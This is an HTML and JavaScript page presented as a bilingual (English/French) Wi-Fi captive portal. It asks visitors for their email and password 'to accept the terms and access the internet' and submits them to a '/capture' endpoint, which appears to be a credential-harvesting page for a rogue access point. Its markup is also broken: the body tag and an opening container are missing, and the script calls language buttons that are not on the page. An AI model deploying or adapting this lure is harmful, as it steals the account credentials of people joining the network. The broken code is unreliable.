<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portail Captif</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .language-selection {
            margin-bottom: 20px;
        }
        .language-selection button {
            margin: 0 10px;
            padding: 5px 10px;
            cursor: pointer;
        }
        .language-selection button.selected {
            background-color: #ccc;
        }
        .main-content {
            text-align: center;
        }
        .logo {
            width: 80%;
            max-width: 300px;
            height: auto;
            display: block;
            margin: 20px auto;
        }
        h1 {
            margin: 20px 0;
        }
        p {
            margin: 20px 0;
        }
        .input-container {
            margin: 20px 0;
        }
        .input-container label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .input-container input {
            padding: 8px;
            width: 200px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        #accept-button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            margin: 20px 0;
        }
        #accept-button:hover {
            background-color: #45a049;
        }
    </style>
</head>

        <h1 id="title"></h1>
        <p id="paragraph"></p>
        <form action="/capture" method="post">
            <div class="input-container">
                <label id="email-label"></label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="input-container">
                <label id="password-label"></label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" id="accept-button"></button>
        </form>
    </div>
    <script>
        const translations = {
            en: {
                title: "Welcome to the Portal",
                paragraph: "Please enter your email and password to accept the terms and access the internet.",
                button: "Accept",
                emailLabel: "Email:",
                passwordLabel: "Password:"
            },
            fr: {
                title: "Bienvenue sur le Portail",
                paragraph: "Veuillez entrer votre email et mot de passe pour accepter les conditions et accéder à Internet.",
                button: "Accepter",
                emailLabel: "Email :",
                passwordLabel: "Mot de passe :"
            }
        };

        let currentLang = 'en';

        function setLanguage(lang) {
            currentLang = lang;
            document.getElementById('title').textContent = translations[lang].title;
            document.getElementById('paragraph').textContent = translations[lang].paragraph;
            document.getElementById('accept-button').textContent = translations[lang].button;
            document.getElementById('email-label').textContent = translations[lang].emailLabel;
            document.getElementById('password-label').textContent = translations[lang].passwordLabel;

            document.getElementById('lang-en').classList.toggle('selected', lang === 'en');
            document.getElementById('lang-fr').classList.toggle('selected', lang === 'fr');
        }

        setLanguage('en');

        document.getElementById('lang-en').addEventListener('click', () => setLanguage('en'));
        document.getElementById('lang-fr').addEventListener('click', () => setLanguage('fr'));
    </script>
